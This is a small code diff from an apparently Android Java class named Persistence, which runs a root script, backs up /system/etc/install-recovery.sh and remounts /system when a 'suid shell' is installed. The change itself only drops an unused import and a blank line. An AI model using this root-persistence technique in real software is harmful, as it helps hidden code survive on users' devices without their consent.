@@ -11,7 +11,6 @@ import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
-import com.android.deviceinfo.util.ExecuteResult;
 import com.android.deviceinfo.util.StringUtils;
 
 // Use this class only when the suid shell is installed
@@ -87,7 +86,6 @@ public class Persistence {
 		
 		// Backup (if needed) /system/etc/install-recovery.sh
 		Execute.executeRoot(Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + scriptName);
-		
 		Root.removeScript(scriptName);
 		
 		// Remount /system
